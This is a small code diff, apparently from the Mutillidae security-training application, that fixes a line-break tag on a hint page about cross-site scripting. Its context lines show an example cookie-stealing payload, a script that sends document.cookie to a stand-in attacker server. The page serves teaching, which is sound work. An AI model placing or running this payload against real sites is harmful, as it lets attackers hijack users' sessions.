@@ -159,7 +159,7 @@
 			<br/><br/>
 			A more realistic attempt of cookie stealing includes some mechanism to send the value
 			of the cookie to an attacker controlled server
-			</br>
+			<br />
 <code>
 &lt;script&gt;
 	new Image().src="http://some-ip/mutillidae/catch.php?cookie="+encodeURI(document.cookie);
